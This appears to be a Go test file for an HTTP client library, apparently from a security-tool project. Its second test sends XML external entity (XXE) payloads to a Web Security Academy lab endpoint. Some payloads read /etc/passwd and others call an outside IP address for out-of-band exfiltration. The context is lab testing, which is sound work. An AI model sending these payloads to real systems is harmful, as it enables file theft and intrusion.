/**
2 * @Author: shaochuyu
3 * @Date: 1/21/24
4 */

package http

import (
	"bytes"
	"fmt"
	"testing"
)

func TestHttpReq(t *testing.T) {
	req, err := NewRequest("GET", "https://baidu.com", nil)
	if err != nil {
		t.Error(err)
	}
	client := NewClient()

	res, err := client.DoRaw(req)
	if err != nil {
		t.Skipf("skipping: target unreachable: %v", err)
	}

	fmt.Println(res.Text)
	fmt.Println("--------------")
	fmt.Println(string(res.Dump()))
}

func TestXXEReq(t *testing.T) {

	//  https://0a1b006704749c6081755ce2004d000e.web-security-academy.net/product/stock
	//        Postdata:<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
	req, err := NewRequest("POST", "https://0a4500530331449e800cda6b00c40079.web-security-academy.net/product/stock", nil)
	if err != nil {
		t.Error(err)
	}

	payload := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>`
	//	payload = `<?xml version="1.0" encoding="UTF-8"?>
	//<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://165.154.202.205:888/p/391a92/hh8j/"> ]>
	//<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>`

	// payload = "<?xml version=\"1.0\"?><!DOCTYPE ANY [<!ENTITY content SYSTEM \"file:///etc/passwd\">]><a>&content;</a>"
	//payload = "<!DOCTYPE foo [ <!ENTITY %% xxe SYSTEM \"file:///etc/passwd\"> %%xxe; ]>"
	//payload = fmt.Sprintf("<?xml version=\"1.0\"?><!DOCTYPE ANY [<!ENTITY content SYSTEM \"%s\">]><a>&content;</a>", "http://165.154.202.205:888/p/391a92/hh8j/")
	// payload = fmt.Sprintf("<!DOCTYPE foo [ <!ENTITY %% xxe SYSTEM \"%s\"> %%xxe; ]>", "http://165.154.202.205:888/p/391a92/hh8j/")
	// payload = fmt.Sprintf("<?xml version=\"1.0\"?><!DOCTYPE ANY [<!ENTITY content SYSTEM \"%s\">]><a>&content;</a>", "http://165.154.202.205:888/p/391a92/hh8j/")
	payload = fmt.Sprintf("<!DOCTYPE stockCheck [<!ENTITY %% xxe SYSTEM \"%s\"> %%xxe; ]>", "http://165.154.202.205:888/p/391a92/hh8j/")

	req.SetHeader("Accept", "*/*")
	// req.SetHeader("Cookie", "session=Qe1MpUGtinJerQ6iSzSypLUnHcwywxXo")
	req.SetHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
	// <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
	req.WithXMLBody(bytes.NewReader([]byte(payload)))
	client := NewClient()

	res, err := client.DoRaw(req)
	if err != nil {
		t.Skipf("skipping: target unreachable: %v", err)
	}
	//
	fmt.Println(string(req.Dump()))
	fmt.Println("--------------")
	fmt.Println(res.Text)
	fmt.Println("--------------")
	fmt.Println(string(res.Dump()))
}
